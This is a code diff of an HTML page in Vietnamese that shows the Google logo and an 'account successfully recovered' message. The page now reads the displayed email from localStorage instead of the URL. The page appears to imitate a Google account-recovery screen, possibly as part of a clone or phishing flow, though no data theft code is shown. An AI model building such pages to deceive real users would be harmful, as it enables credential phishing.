@@ -15,7 +15,7 @@
       <img id="logo" src="Logo/Google_2015_logo.svg.webp" />
       <h3>Chúng tôi đã khôi phục thành công tài khoản của bạn</h3>
       <div id="text-gmail">
-        <p>123@gmail.com</p>
+        <p id="emailDisplay"></p>
       </div>
       <hr />
       <p class="text-bold">Chào mừng bạn quay lại tài khoản của mình</p>
@@ -25,14 +25,13 @@
   </div>
   <script>
     document.addEventListener("DOMContentLoaded", function () {
-      const urlParams = new URLSearchParams(window.location.search);
-      const email = urlParams.get('email');
-      const textGmail = document.querySelector('#text-gmail p');
+      const emailDisplay = document.getElementById('emailDisplay');
+      const storedEmail = localStorage.getItem('email');
 
-      if (textGmail && email) {
-        textGmail.textContent = email;
+      if (emailDisplay && storedEmail) {
+        emailDisplay.textContent = storedEmail;
       } else {
-        console.error('Không tìm thấy phần tử #text-gmail p hoặc không có email trong URL.');
+        console.error('Không tìm thấy phần tử #text-gmail p hoặc không có email trong Local Storage.');
       }
     });
   </script>
